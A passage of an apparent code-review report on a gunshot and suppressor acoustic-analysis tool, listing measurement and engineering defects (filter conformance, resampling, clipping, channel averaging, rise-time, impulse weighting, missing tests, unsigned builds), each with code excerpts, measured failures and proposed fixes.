`bands.py:94` · Bands & Spectral · IEC 61260-1:2014 clause 5.4 and Table 1 (acceptance limits on relative attenuation, classes 0/1/2).

```python
order: Filter order (default 4 for IEC 61260 Class 1).
...
        sos = butter(order, [low_norm, high_norm], btype='band', output='sos')
```

**Failure:** The repository contains no test that evaluates any designed filter against the IEC 61260-1 relative-attenuation mask, yet the docstring here and the class docstring (bands.py:138-141) assert Class 1 conformance, and that claim will be repeated in customer-facing suppressor reports. Measured response of the shipped design for the 1 kHz band at fs=48000, order=4 (scipy butter -> 8 poles): 0.00 dB at fm, -0.81 dB at f/fm = 1.0995, -3.01 dB at the nominal band edges, -11.26 dB at f/fm = 1.1710, -21.45 dB at 1.2371, -24.23 dB at the ADJACENT band centre (1258.9 Hz), -38.70 dB at 1.4125 and -64.92 dB at 1.9953. Concrete consequence: a suppressor tone at 1171 Hz is 11.26 dB down in the 1000 Hz band while the 1250 Hz band's skirt is 24 dB down at 1000 Hz, so the reported 1/3-octave spectrum understates that component by roughly 9 dB in both neighbours. Raising the order does not fix it: measured order=6 gives -16.48 dB and order=8 gives -21.87 dB at f/fm = 1.1710, because butter() always places the -3 dB points at the specified edges, so higher order makes the in-band shape narrower, not flatter. Excess noise bandwidth measured at ENBW/BW = 1.026 (+0.11 dB per band on broadband noise).

**Fix:** Immediately delete the Class 1 claim from bands.py:94, bands.py:138-141 and README.md:455 and replace it with the measured response. Then add validate_class1(sos, fm, fs, fraction) that evaluates 20*log10|H| at the IEC 61260-1 Table 1 normalized frequencies fm*G^(Omega/(2*fraction)) and asserts the class-1 mask, called for every band at construction. Reach conformance by raising the Butterworth order (order 8 already passes Omega=2 and Omega=1.0 in my measurement; check Omega=1.5/3/4 and raise further or switch to an elliptic/Chebyshev-II design) - do NOT assume order is useless.


### The desktop app force-resamples all video audio to 44.1 kHz / 16-bit / mono, destroying the bandwidth the product's own README says it preserves

`app.py:226` · Shot Detection & Sampling · MIL-STD-1474E / ANSI S12.7 blast-measurement bandwidth

```python
[ffmpeg, '-i', str(video_path), '-vn', '-acodec', 'pcm_s16le',
         '-ar', '44100', '-ac', '1', '-y', str(wav_path)],
```

**Failure:** Every video the GUI accepts (VIDEO_EXTS covers .mp4/.mov/.mkv/...) is decimated to 44.1 kHz before any analysis. Verified consequences at 44.1 kHz: ThirdOctaveAnalyzer yields 30 bands topping out at 16000 Hz vs 37 bands to 80000 Hz at 192 kHz (bands.py:152,169), so all blast energy above 22.05 kHz is anti-alias-filtered out of Lpeak_Z, LZE and the band exposure; compute_rise_time (metrics.py:257) quantizes to 22.68 us so the reported rise_time_us can only be 0.0, 22.7 or 45.4 us against the module's own documented 1-50 us range (metrics.py:223); and `-ac 1` averages every channel of a multi-mic take. This directly contradicts main.py:18 ("Audio is always used at the file's native sample rate (e.g. 192 kHz); no resampling") and README.md:227 ("no resampling is performed ... critical for accurate high-frequency analysis of gunshot spectra"), while README.md:859 requires >= 96 kHz. A lab comparing a 192 kHz WAV against the same shot captured on video gets materially different dB numbers from the same tool.

**Fix:** In app.py:225-228 drop '-ar' and '-ac' entirely and use '-acodec pcm_f32le' so the container's native rate, depth and channel count survive; keep the ffmpeg call otherwise unchanged. Then record the extracted file's actual sample_rate, bit depth and channel count in analysis_metadata.json, and have analyze_file() emit a prominent warning (UI banner, not just stdout) whenever sample_rate < 96000 stating that rise time and >20 kHz band content are unresolved.


### Extracted video audio is cached by filename stem only, so two different videos with the same name silently analyse the same audio

`app.py:220` · Shot Detection & Sampling

```python
wav_path = output_dir / (video_path.stem + '.wav')

    # Skip extraction if we already have this file
    if wav_path.is_file():
        return wav_path
```

**Failure:** Camera filenames collide systematically: GoPro emits GX010042.MP4, DJI emits DJI_0001.MP4, iPhone emits IMG_1234.MOV, in every folder. Test suppressor A at /tests/A/GX010042.MP4 then suppressor B at /tests/B/GX010042.MP4 and the second analysis finds UPLOAD_DIR/GX010042.wav already present, skips extraction, and reports suppressor A's acoustic data under suppressor B's name, with no log line indicating reuse. The CLI has the identical bug at main.py:1121-1122 (`if not audio_path.exists(): extract_audio(...)`, keyed on `wav_path.stem`). Nothing in analysis_metadata.json records which video the WAV came from, so the error is undetectable after the fact.

**Fix:** Key the cache on content: `wav_path = output_dir / f'{video_path.stem}_{sha256_of(video_path)[:12]}.wav'` in both app.py:218 and main.py:1119 (hash the first and last 1 MB plus size if full hashing is too slow on 4K files). Log 'reusing previously extracted audio from <source>' on every cache hit, and add source_video_path plus source_hash to AnalysisResult.to_dict.


### An ffmpeg extraction that hits the 120 s timeout leaves a truncated WAV on disk that the cache then serves as a complete recording

`app.py:225` · Shot Detection & Sampling

```python
result = _sp.run(
        [ffmpeg, '-i', str(video_path), '-vn', '-acodec', 'pcm_s16le',
         '-ar', '44100', '-ac', '1', '-y', str(wav_path)],
        capture_output=True, text=True, timeout=120,
    )
```

**Failure:** subprocess.run(timeout=120) kills ffmpeg and raises TimeoutExpired, but ffmpeg has been writing the output progressively with `-y`, so a partial WAV remains at output_dir/<stem>.wav. The return-code and zero-size guards at app.py:230-234 are never reached because the exception is raised first, and no cleanup runs. The user sees an error, clicks Run Analysis again, and this time the cache check at app.py:221 finds the partial file and returns it immediately — the analysis now 'succeeds' on a truncated recording, silently reporting fewer shots and an aggregate computed over only the first portion of the string. A 40-minute 4K range video on a laptop routinely exceeds 120 s of extraction time.

**Fix:** Wrap the _sp.run in try/except subprocess.TimeoutExpired, extract to `wav_path.with_suffix('.partial.wav')` and os.replace() into place only after returncode == 0 and a non-zero size, unlinking the partial on any failure path. Scale the timeout with source size (or drop it and stream ffmpeg progress to the WebSocket). Also compare the extracted duration against the container's audio duration (ffprobe) before accepting - that catches a silently short extraction even when ffmpeg exits 0.


### No clipping or over-range detection anywhere: a clipped recording reports a fabricated, constant peak level as a measurement

`main.py:792` · Shot Detection & Sampling · MIL-STD-1474E measurement validity

```python
peak_Pa = np.max(np.abs(pressure_Pa))
    peak_dB = amplitude_to_dB_SPL(peak_Pa)
```

**Failure:** Verified: a 24-bit file whose shots hit digital full scale, analysed with the default Pa_per_FS=143.96, reports Lpeak_Z = 137.14 dB for EVERY clipped shot with no warning, no flag in analysis_metadata.json and no annotation on the plots. A grep across all .py and .js sources for clip/saturat/overload finds zero occurrences outside of moviepy's VideoFileClip and navigator.clipboard. Because clipping truncates the waveform, the derived metrics are also wrong in a specific direction: LZE/LAE under-reported, crest_factor_dB compressed, rise_time_us shortened and kurtosis reduced. A suppressor comparison where the unsuppressed condition clipped and the suppressed one did not under-states the suppressor's reduction by exactly the amount of clipping — the single most common gross error in field gunshot data.

**Fix:** As proposed, with one implementation note: load_wav returns floats already scaled to [-1,1] (WavLoader.py:110), so detect clipping on the loaded float array as runs of >=3 consecutive samples with |s| >= 0.999 rather than trying to recover integer full scale. Record clipped_samples, per-shot clipped flag and peak dBFS in analysis_metadata.json and as a metrics_summary.csv column, exclude clipped shots from compute_aggregate_metrics, and shade the clipped intervals in plot_waveform_pa.


### Every multichannel file is averaged to mono, which destroys a multi-microphone measurement: up to -6.02 dB peak error and comb-filtering of a spaced pair

`main.py:778` · Shot Detection & Sampling · MIL-STD-1474E microphone positions

```python
# Note: ST2012 is stereo pair, but we average to mono for analysis
    print("\n[1/6] Loading audio...")
    wav_data = load_wav(wav_path, dtype=config.load_dtype, mono=True)
```

**Failure:** mono=True is hard-coded at every load site in the pipeline (main.py:778 full-load path; 409, 460, 494, 512, 547, 599, 652, 690 chunked path) and there is no channel-selection flag in the CLI, in AnalysisConfig, or in the UI. WavLoader.py:117 does `data_mono = data.mean(axis=1)`. Verified numerically: (a) a 2-channel take where mic B is quiet at the instant of mic A's peak (different distance/angle, e.g. shooter's ear plus 1 m left per MIL-STD-1474E) reports Lpeak = 128.7 dB when the true channel-A level is 134.7 dB — exactly -6.02 dB; (b) a dual-record recorder with a -20 dB safety track on channel 2 (Zoom/Sound Devices, standard practice for gunfire so the blast never clips) reports -5.19 dB low; (c) a spaced pair 0.17 m apart (tau = 0.5 ms) becomes a comb filter |cos(pi f tau)| with nulls at 1, 3, 5, 7 kHz — the exact region that dominates LAE — measured -3.3 dB on LZE for a single blast. None of this is flagged; the file simply reports a number.

**Fix:** Add `channel: int | str = 0` to AnalysisConfig, thread it to every load_wav/load_wav_chunk call as an index rather than mono=True, and emit one metrics row plus one plot set per channel when n_channels > 1. Until that lands, the minimum viable fix is: read n_channels from get_wav_info, and when it is > 1 and no channel was chosen, print a UI-visible warning and stamp `channels_averaged: n` in analysis_metadata.json so the mixdown is at least on the record.


### Peaks rejected by the refractory period are discarded, never deferred, so a 200 ms refractory under-counts a rapid-fire string by ~40%

`shot_detect.py:158` · Shot Detection & Sampling

```python
# Check refractory period
            if peak_sample_idx - last_peak_idx >= refractory_samples:
                peaks.append(int(peak_sample_idx))
                last_peak_idx = peak_sample_idx
```

**Failure:** Verified with the real code at 48 kHz, default refractory_ms=200: three blasts at 100/200/300 ms -> 2 detected (t=100.0 ms, t=300.0 ms); five blasts at 100/200/300/400/500 ms -> 3 detected (100, 300, 500 ms). A 5-round string fired at 600 rpm is reported as 3 shots, and compute_aggregate_metrics() then averages LAE/LAFmax over the wrong subset. The default refractory makes any cadence faster than 300 rpm structurally uncountable, and the operator gets no warning because main.py never passes min_shots (shot_detect.py:204 `min_shots: int = 0`).

**Fix:** Change the default refractory to 50 ms (1200 rpm) in AnalysisConfig (main.py:85), the CLI default (main.py:1046) and index.html:157. Do not re-anchor on rejected candidates - instead return them in a `rejected_candidates` list (time, envelope level, reason) that save_json_metadata writes into analysis_metadata.json, and add an expected-round-count field wired to shot_detect's existing min_shots so a count mismatch is a hard, UI-visible error rather than a stdout print.


### An uncalibrated run (Pa_per_FS = 1.0) can never exceed 94 dB SPL, so the absolute 100/120 dB threshold detects ZERO shots and the pipeline then reports 0.0 dB as a measurement

`shot_detect.py:262` · Shot Detection & Sampling

```python
# Convert dB threshold to Pa
    threshold_Pa = P_REF * (10.0 ** (threshold_dB / 20.0))
```

**Failure:** Verified by execution. Calibration.uncalibrated() (calibration.py:144) sets Pa_per_FS=1.0, so a full-scale sample is 1.0 Pa = 93.98 dB SPL — the theoretical ceiling. threshold_dB=100 gives threshold_Pa = 2.0 Pa and threshold_dB=120 (main.py:88 default, ui/renderer/index.html:152 default) gives 20.0 Pa. Running detect_shots() on a full-scale 1 ms impulse returns 0 shots at BOTH thresholds. Downstream nothing stops: main.py:837 calls compute_aggregate_metrics([]) which returns Lpeak_Z_max=0.0, LAE_mean=0.0, LAFmax_mean=0.0 (metrics.py:610-619); save_csv_summary returns early (main.py:325-326) so metrics_summary.csv is never written; save_json_metadata still writes n_shots:0 with those zeros; app.py:847 sends {'type':'complete'} and ui/renderer/app.js:246-251 renders metric cards reading "Peak SPL (Z) 0.0 dB", "LAFmax (mean) 0.0 dB", "LAE (mean) 0.0 dB" — placeholder zeros presented to the user as measured levels. The CLI prints one line (main.py:1141) but the GUI, which is the shipped product, does not.

**Fix:** Drop the uncalibrated() framing. (1) In detect_shots(), compute max_possible_dB = amplitude_to_dB_SPL(np.max(np.abs(x))) and raise a structured error when threshold_dB >= max_possible_dB, naming both numbers. (2) Make compute_aggregate_metrics return None for every field when n_shots == 0 (metrics.py:610-619) so formatDb's existing null branch renders an em-dash without any JS change. (3) Have analyze_file() surface an explicit 'no shots detected' error to the WebSocket (app.py:847) instead of {'type':'complete'}, and make the UI show that banner rather than the results view. (4) Wiring threshold_relative_dB (dead today - grep shows it is never passed from main.py, app.py or the UI) into the CLI/UI as a selectable mode is a good addition but is not required to fix the zero-shot reporting.


### refine_peak_location searches a hard-coded ±500 SAMPLES, so the peak-refinement span varies 4.4x with sample rate and the JSON peak disagrees with the CSV peak

`shot_detect.py:171` · Shot Detection & Sampling

```python
search_window: int = 500,
```

**Failure:** Called with the default at shot_detect.py:278 (`refined_idx = refine_peak_location(x, approx_idx)`), never scaled by sample_rate. That is ±11.34 ms at 44.1 kHz, ±10.42 ms at 48 kHz, ±5.21 ms at 96 kHz, ±2.60 ms at 192 kHz. Two failures follow. (a) Sample-rate-dependent results: a muzzle blast and a ballistic crack 5 ms apart are inside the search span at 44.1/48 kHz — the refiner jumps to whichever is larger — but outside it at 192 kHz, so the same physical event yields a different shot time, a different window position and different per-shot metrics purely because of the recorder setting. (b) JSON/CSV disagreement: the extraction window is 250 ms (12000 samples at 48 kHz) but refinement only searches 500 samples, so when the true window maximum lies further away, ShotEvent.peak_dB_SPL (written to analysis_metadata.json at main.py:376) and ShotMetrics.Lpeak_Z (written to metrics_summary.csv) describe the same shot with different numbers. Verified: a 300 Pa precursor 100 ms before a 3000 Pa blast yields JSON peak_dB_SPL = 143.8 dB while the CSV Lpeak_Z for that same shot is 163.5 dB — a 19.7 dB discrepancy in two files the customer receives together.

**Fix:** Two changes. (1) Make ShotEvent.peak_Pa identical by construction to the reported Lpeak_Z: after computing window_start/window_end at shot_detect.py:285-286, set refined_idx = window_start + argmax(|x[window_start:window_end]|) and derive peak_Pa/peak_dB_SPL from it, then assert agreement with metrics.Lpeak_Z to 0.1 dB before writing outputs. (2) Independently, make search_window time-based (int(0.002 * sample_rate)) and pass it explicitly from detect_shots so behaviour stops depending on the recorder setting.


### No validation that post_ms <= refractory_ms, so overlapping windows count the same blast energy into two shots' SEL

`shot_detect.py:199` · Shot Detection & Sampling · IEC 61672-1 sound exposure level

```python
pre_ms: float = 50.0,
    post_ms: float = 200.0,
    refractory_ms: float = 200.0,
```

**Failure:** The defaults are exactly critical (post_ms == refractory_ms), so any operator who lengthens the post window to capture a reverberant tail or a full B-duration — e.g. --post-ms 500 while leaving --refractory-ms 200, both freely settable in the CLI (main.py:1045-1050) and the UI — silently starts double-counting. Verified: two blasts 250 ms apart with post_ms=500, refractory_ms=200 produce windows [150,700] ms and [400,950] ms; shot 1's window fully contains shot 2's blast, giving LZE=127.55 dB versus 124.48 dB for the isolated shot — +3.07 dB of energy that belongs to a different round, reported as shot 1's sound exposure level.

**Fix:** Prefer the clamping variant over the hard ValueError so operators can still capture long tails: after peak selection, set each shot's window_end = min(refined_idx + post_samples, next_shot.window_start) and record the achieved integration time per shot in the CSV/JSON. Keep a warning (not a fatal error) when post_ms > refractory_ms, and mirror the constraint in the CLI help and the UI hint text.


### Every analysis path hard-codes mono=True, averaging multichannel recordings and destroying multi-microphone measurements

`main.py:778` · Engineering Quality · MIL-STD-1474E

```python
wav_data = load_wav(wav_path, dtype=config.load_dtype, mono=True)
```

**Failure:** mono=True is hard-wired at main.py:778 and at all eight load_wav_chunk call sites (lines 409, 460, 494, 512, 547, 599, 652, 690); there is no CLI flag, no AnalysisConfig field, and no UI control to choose a channel. WavLoader.load_wav then does `data.mean(axis=1)` (line 117). Concrete: the standard MIL-STD-1474E left-ear/right-ear pair, or the common suppressor-test layout of a 1 m muzzle-left mic and a shooter's-ear mic on the same recorder. Channel 0 sees 168 dB peak (peak_Pa = 4000 Pa), channel 1 sees 148 dB (400 Pa). The mean is 2200 Pa -> 160.8 dB, which is neither microphone's reading and is 7.2 dB below the true worst-case exposure that determines hearing-hazard compliance. If the two mics are at different distances the impulses are also time-offset, so the average smears the leading edge and inflates rise_time_us. README.md's 'Known Limitations' item 5 documents this as 'multichannel recordings are mixed to mono' — it is documented, but it is still a silently wrong number rather than a refusal.

**Fix:** Add `channel: Optional[int] = None` to AnalysisConfig plus `--channel N` and `--mix-to-mono`, threading it through all nine load sites. Minimum acceptable interim fix: read sf.info(...).channels before loading and refuse to proceed on a multichannel file unless a channel or explicit mixdown is specified, and always record n_channels and channel_analyzed in analysis_metadata.json — silent averaging must not remain the default.


### MP3/AAC/OGG/WMA are on the accepted-format list and produce a printed number with only a soft warning

`main.py:1126` · Engineering Quality

```python
if wav_path.suffix.lower() not in AUDIO_EXTS:
        print(f"Warning: {wav_path.suffix} may not be a supported audio format.")
```

**Failure:** FileSelector.py:30-32 defines `AUDIO_EXTS = ['.mp3', '.wav', '.flac', '.aac', '.m4a', '.ogg', '.opus', '.wma', '.aiff', '.alac']`. main.py:1126 warns only for extensions NOT in that list, so an .mp3 passes with no warning at all, and modern libsndfile (>=1.1) decodes it happily through sf.read. Concrete: a range video's audio track, or a phone recording, is a 128 kbps lossy encode. Perceptual coding discards exactly the transient energy that defines a gunshot — the codec's pre-echo control smears the 20 us leading edge across a ~20 ms MDCT frame, and the quantizer's noise shaping alters the level in every band above ~16 kHz. Lpeak can be off by 5-15 dB and rise_time_us is pure fiction, yet the CSV reports 'rise_time_us: 340.0' to one decimal place as though it were measured. Nothing in the output records that the source was lossy.

**Fix:** As proposed. Note the split must be made in FileSelector.py:30-32 (the picker's filter) as well as at main.py:1126, or the file dialog still offers MP3 as a first-class choice. Record sf.info(...).subtype and format in analysis_metadata.json unconditionally — that single field also documents PCM_16 vs PCM_24 vs FLOAT for legitimate WAVs and is the cheapest half of this fix.


### Zero automated tests anywhere in the repository — no analytical ground truth pins any dB value

`pyproject.toml:49` · Engineering Quality · IEC 61672-1 Table 3; IEC 61260-1; ISO 266; MIL-STD-1474E

```python
dev = [
    "pytest>=7.0",
    "ruff>=0.1",
]
```

**Failure:** `git ls-files` lists 30 files: 14 Python modules, 5 UI files, 4 build files, README, .gitignore, workflow, 4 assets. There is no tests/ directory, no test_*.py, no conftest.py, and no pytest invocation in .github/workflows/build.yml. pytest is declared as a dev extra but nothing consumes it. Concrete consequence: a one-character sign error in weighting.py's A-weighting offset (`+ 2.0` at weighting.py:395) or a factor-of-2 error in bands.py's SEL reference time (bands.py:370) would ship to a customer and be discovered only when a suppressor is certified against a wrong number. Nothing in this repo can tell a correct 134.13 dB from a wrong 137.14 dB.

**Fix:** Add tests/ + a CI pytest job. Keep proposed suites 1,2,3,5,6,7,8 as written. Correct suite 4: this implementation does NOT use base-10 exact centers — bands.py:36-48 hardcodes the nominal ISO_CENTER_FREQUENCIES array and bands.py:75 derives edges as fc*2^(±1/6) (base-2). Asserting center_frequencies == 1000*10**(k/10) would fail against the shipped code, so that assertion is a proposed behavior change, not a regression test; write the Parseval band-sum-vs-broadband check (which is implementation-agnostic) and raise the base-2-vs-base-10 edge convention as its own separate correctness question.


### macOS .app is built and released unsigned and un-notarized — Gatekeeper blocks it on every customer machine

`sasa.spec:136` · Engineering Quality

```python
codesign_identity=None,
        entitlements_file=None,
```

**Failure:** sasa.spec sets codesign_identity=None for both the macOS EXE (line 136) and the Windows EXE (line 190), and .github/workflows/build.yml has no `codesign`, `xcrun notarytool`, `xcrun stapler`, or `signtool` step — it goes straight from `pyinstaller sasa.spec` (line 33) to `zip -r -y ../SASA-macOS.zip SASA.app` (line 39) to a GitHub release (line 52). A customer downloads SASA-macOS.zip from the Releases page README.md points them at, unzips, double-clicks: macOS applies the com.apple.quarantine xattr and refuses with '"SASA" is damaged and can't be opened. You should move it to the Trash.' — the notarization-failure message, which reads as corruption rather than a signing gap. On Windows, the unsigned SASA.exe triggers a SmartScreen 'Windows protected your PC' interstitial and many corporate AV policies quarantine unsigned PyInstaller one-file binaries outright. The product is effectively undeliverable through the documented channel.

**Fix:** As proposed. Two additions: PyInstaller onefile/onedir bundles need the com.apple.security.cs.allow-unsigned-executable-memory and allow-dyld-environment-variables entitlements, and note that sasa.spec:131/143/183 set upx=True — UPX-mangled binaries break codesigning and are a known source of silent corruption in scientific builds, so drop upx before wiring up signing. Until certs exist, document `xattr -dr com.apple.quarantine /Applications/SASA.app` in the README.


### compute_rise_time returns a 500x-wrong number when the window has DC offset or wind rumble; the 'not found' path silently falls back to i_10 = 0

`metrics.py:244` · Acoustic Metrics · MIL-STD-1474E, Appendix D (impulse noise waveform parameters — rise time measured on the positive overpressure phase from ambient)

```python
# Search backwards from peak for 10% crossing (onset of impulse)
    i_10 = 0
    for i in range(peak_idx, -1, -1):
        if abs_p[i] <= threshold_10:
            i_10 = i
            break
```

**Failure:** There is no DC removal or high-pass anywhere in the pipeline (grep for detrend/highpass/remove_dc across all .py returns nothing). If |p| never dips below 0.1*peak anywhere before the peak, the loop never breaks and i_10 stays at its initialiser 0, so rise_samples = i_90 - 0 = the entire pre-trigger. Measured on a 96 kHz, 50 ms-pre-trigger window containing a shot whose true 10-90% rise is 104.2 us: with a DC offset of 20% of peak the function returns 50104.2 us (a 480x error); with a 5 Hz wind-rumble component at 15% of peak it returns 22302.1 us (a 214x error). Both offsets are ordinary in field gunshot recordings (unscreened mic, infrasonic wind loading, AC-coupling settle after a preceding shot). The value is written straight to metrics_summary.csv (main.py:357) and to JSON with no flag, so a report will claim a 50 ms rise time for a muzzle blast and the reader has no way to know it is garbage.

**Fix:** (1) Add a 10-20 Hz 2nd-order Butterworth high-pass (or at minimum subtract the pre-trigger mean) to the signal used for rise time, B-duration and A-duration — not to the signal used for Lpeak/SEL, which must stay Z-weighted per MIL-STD. (2) Replace the silent `i_10 = 0` initialiser with a found-flag: if no 10% crossing exists between window start and peak, return float('nan') and set a `rise_time_valid` field on ShotMetrics that propagates to to_dict() (metrics.py:113) and the CSV writer (main.py:333). (3) Anchor the search to a pre-trigger ambient baseline rather than to whatever abs_p does.


### compute_b_duration counts samples above 0.1·peak instead of measuring the envelope interval, underestimating by ~27% on any oscillatory waveform and by 250x with an LF offset

`metrics.py:284` · Acoustic Metrics · MIL-STD-1474E, Appendix D (B-duration: total time the pressure envelope is within 20 dB of peak)

```python
# -20 dB below peak in linear amplitude = factor of 0.1
    threshold = peak_val * 0.1
    n_above = int(np.sum(abs_p >= threshold))
    return n_above / sample_rate * 1000.0  # milliseconds
```

**Failure:** For any oscillatory waveform |p| dips below the threshold twice per cycle, so counting samples measures the DUTY CYCLE of the carrier above threshold, not the duration of the event. Measured on a decaying sinusoid p(t)=200·exp(-t/5ms)·sin(2πf₀t) at 96 kHz: the true envelope B-duration is tau·ln(10) = 11.51 ms, but the function returns 8.36 ms (f₀=500 Hz), 8.38 ms (1 kHz), 8.38 ms (2 kHz) — a frequency-independent 27.3% underestimate (ratio 0.727 = the time-fraction a sinusoid spends above a decaying threshold). Since suppressors lengthen and lower the tail, a 27% duration underestimate applied to both suppressed and unsuppressed shots corrupts any duration-based comparison. Separately, the same count is not an interval at all: with a 20%-of-peak DC/rumble offset present the function returns 249.708 ms — i.e. the ENTIRE 250 ms extraction window — for a shot whose true B-duration is 1.0 ms (a 250x error), because every sample is above threshold.

**Fix:** Compute the envelope first — env = np.abs(scipy.signal.hilbert(p_highpassed)) or a short peak-hold/RMS envelope — then sum the time env >= 0.1*env_max between the first and last crossing, with linearly interpolated crossing instants. Keep the sum-of-disjoint-intervals semantics (that part of the current code is right; only the operand is wrong). High-pass first, per the rise-time fix. Report first-crossing and last-crossing times as fields so a reviewer can see whether a reflection extended the interval, and flag when the interval touches a window boundary.


### compute_rise_time searches backward from argmax(|p|), so it measures a quarter-cycle of ringing when the global peak is not on the first cycle, and measures the RAREFACTION phase when the global peak is negative-going

`metrics.py:233` · Acoustic Metrics · MIL-STD-1474E, Appendix D (rise time defined on the positive overpressure phase, ambient to peak)

```python
abs_p = np.abs(pressure_Pa)
    peak_val = float(np.max(abs_p))
    peak_idx = int(np.argmax(abs_p))
```

**Failure:** Two distinct failures, both verified numerically at 96 kHz. (A) Global peak on a later oscillation cycle: for a signal with a 20 us shock front followed by an 800 Hz decaying ring whose second lobe is the global |p| max, argmax lands at t=271 us and the backward search stops at the immediately preceding zero crossing, returning 166.7 us instead of the true 20 us shock rise — an 8x error that is simply the quarter-period of the ring (312/2 us), i.e. the function is reporting a property of the ringing frequency, not of the shock front. This is the normal case for a suppressed shot, where the muzzle-blast front is attenuated below the can's resonance and below room reflections. (B) Negative-going global peak: for a Friedlander wave followed by a strong negative reflection, argmax|p| lands at t=4.00 ms on a value of -261.5 Pa and the function returns 250.0 us — a rise time measured entirely on the rarefaction/negative excursion. MIL-STD-1474E defines rise time on the POSITIVE overpressure phase from ambient to the positive peak; taking abs() discards the sign and lets the metric be defined by whichever excursion happens to be largest, which for reflective sites, indoor ranges, and inverted-polarity mic chains is routinely the negative one.

**Fix:** Anchor to onset and the signed positive peak: (1) find onset as the first crossing of ~3x the pre-trigger ambient RMS after window start (the 50 ms pre-trigger at main.py:89 gives a clean ambient estimate); (2) take p_peak = max of the SIGNED high-passed pressure within ~1-2 ms of that onset, not max|p| over the 250 ms window; (3) measure 10%/90% searching FORWARD from onset on that first rise, returning NaN (with a validity flag) if it is not monotonic. Report the signed positive peak as a separate field so it is auditable against Lpeak_Z = max|p|. Add a polarity warning when the first-cycle largest excursion is negative. Note this fix and the rise-time DC/fallback fix should be implemented together — they touch the same 25 lines.


### compute_impulse_exponential_average is a peak-riding asymmetric one-pole, not the IEC Impulse detector; LAImax/LZImax read +2.6 dB high on a steady tone and +5.5 to +9.0 dB high on rapid strings

`metrics.py:206` · Acoustic Metrics · IEC 61672-1:2013 / IEC 60651 (I time-weighting: 35 ms exponential average cascaded with a detector whose decay rate does not exceed 2.9 dB/s)

```python
state = 0.0
    for i in range(n):
        if x_squared[i] > state:
            state = alpha_attack * x_squared[i] + (1.0 - alpha_attack) * state
        else:
            state = alpha_decay * x_squared[i] + (1.0 - alpha_decay) * state
        y[i] = state
```

**Failure:** IEC specifies I time-weighting as TWO CASCADED STAGES: an unconditional 35 ms exponential average, followed by a separate detector whose output decays at no more than 2.9 dB/s (equivalently tau = 1.498 s on mean-square — so the 1.5 s constant is right, but it belongs to a HOLD stage, not to a branch of the averager). The code instead uses ONE state that switches time constant on an instantaneous comparison of x² against the state. Because x² for any real acoustic signal swings from 0 to ~2x its mean twice per cycle, the state freezes (1.5 s) during every trough and only integrates (35 ms) during the crests — so it converges to the UPPER ENVELOPE of x², not its 35 ms mean. Verified at 96 kHz: a steady 1 Pa-rms 1 kHz tone (true Leq 93.98 dB) gives IEC I = 93.99 dB but SASA = 96.62 dB (+2.64 dB); broadband noise at Leq 94.00 dB gives IEC 94.20 dB but SASA 100.10 dB (+6.10 dB). Worse, the state ACCUMULATES across events because it never decays back with the 35 ms constant: for a rapid string of shots in one window, SASA vs IEC LZImax is 126.82 vs 121.31 dB at 5 rounds/s (+5.51), 129.28 vs 121.56 at 10 rounds/s (+7.72), 130.66 vs 122.01 at 15 rounds/s (+8.65), 131.49 vs 122.51 at 20 rounds/s (+8.97). LAImax and LZImax are written to metrics_summary.csv (main.py:355-356) with no caveat, and README.md:477 explicitly claims 'The Impulse time weighting uses an asymmetric detector per IEC 61672-1'.

**Fix:** Implement the two IEC stages: a = 1-exp(-1/(fs*0.035)); y35 = scipy.signal.lfilter([a],[1,-(1-a)], x_squared); then a decay-limited hold at 2.9 dB/s. LAImax = power_to_dB_SPL(max(y35)) exactly — the hold stage never exceeds the 35 ms average's maximum, so for the *max* metric the hold can be skipped entirely and only needs implementing if the I-weighted time curve is ever plotted. Apply the same correction to the duplicate detector in bands.py:249-263. Correct README.md:476-477, which currently asserts the wrong formula is the IEC one.


### Kurtosis, crest factor and spectral centroid are computed over the whole 250 ms window, so they measure the amount of trailing silence rather than the shot (kurtosis varies 12x, crest 10 dB, for the identical shot)

`metrics.py:359` · Acoustic Metrics · MIL-STD-1474E (kurtosis-based impulsive noise criteria presuppose a defined analysis interval)

```python
x = np.asarray(pressure_Pa, dtype=np.float64)
    mu = np.mean(x)
    centered = x - mu
    m2 = float(np.mean(centered ** 2))
    m4 = float(np.mean(centered ** 4))
```

**Failure:** compute_kurtosis, compute_crest_factor (metrics.py:302-308) and compute_spectral_centroid (metrics.py:326-341) all receive the full extraction window (metrics.py:497-499), which is 50 ms pre-trigger + 200 ms tail and is >90% silence/decay for a suppressed shot. Both m2 and rms are dominated by the silent fraction, so both metrics scale with window length. Measured at 96 kHz on ONE identical synthetic shot, varying only post_shot_ms: post=100 ms -> crest 21.62 dB, kurtosis 41.3; post=200 -> 23.83 dB, 70.9; post=400 -> 26.39 dB, 130.3; post=800 -> 29.15 dB, 249.1; post=1600 -> 32.03 dB, 486.6. That is +3.01 dB of crest factor and a doubling of kurtosis per doubling of trailing silence — a 12x kurtosis range and a 10.4 dB crest range for the same physical event. post_shot_ms is a user-facing knob (AnalysisConfig.post_shot_ms, main.py:89; --post-ms), so two operators analysing the same WAV with different settings get different 'impulsiveness'. README.md:594 and metrics.py:351 claim kurtosis is 'used in MIL-STD-1474E for impulsive noise assessment' — the MIL-STD kurtosis criterion presumes a defined analysis interval, which this has not got. For comparison, scoping the same three metrics to the -20 dB envelope interval gives crest 10.90 dB, kurtosis 4.4 and centroid ~2645 Hz stable to <0.1% across all five window lengths.

**Fix:** Compute an envelope once per shot (Hilbert or peak-hold on the high-passed signal), find the -20 dB-down points either side of the peak, and pass only that segment to compute_kurtosis / compute_crest_factor / compute_spectral_centroid at metrics.py:497-500. Add an `analysis_interval_ms` field to ShotMetrics, include it in to_dict() and in the CSV fieldnames at main.py:333 so the scoping is auditable. Do NOT change the scoping of Lpeak/SEL/LAFmax in the same edit — those have their own (different) window semantics. If a whole-window kurtosis is still wanted, expose it under a distinct name with its window length attached.


### compute_aggregate_metrics pairs an energy-averaged mean with an arithmetic population std, so the reported '±' interval is neither centred on the mean nor an unbiased σ; Lpeak gets no mean or std at all

`metrics.py:632` · Acoustic Metrics · ISO 17025 / ANSI S12.7 practice for reporting repeated impulse measurements (n, mean, sample standard deviation, confidence interval)

```python
LAE_energy_mean = float(10.0 * np.log10(np.mean(10.0 ** (LAE_values / 10.0))))
    LAFmax_energy_mean = float(10.0 * np.log10(np.mean(10.0 ** (LAFmax_values / 10.0))))

    return AggregateMetrics(
        n_shots=n,
        Lpeak_Z_max=max(Lpeak_Z_values),
        Lpeak_A_max=max(Lpeak_A_values),
        LAE_mean=LAE_energy_mean,
        LAFmax_mean=LAFmax_energy_mean,
        LAE_std=float(np.std(LAE_values)) if n > 1 else 0.0,
```

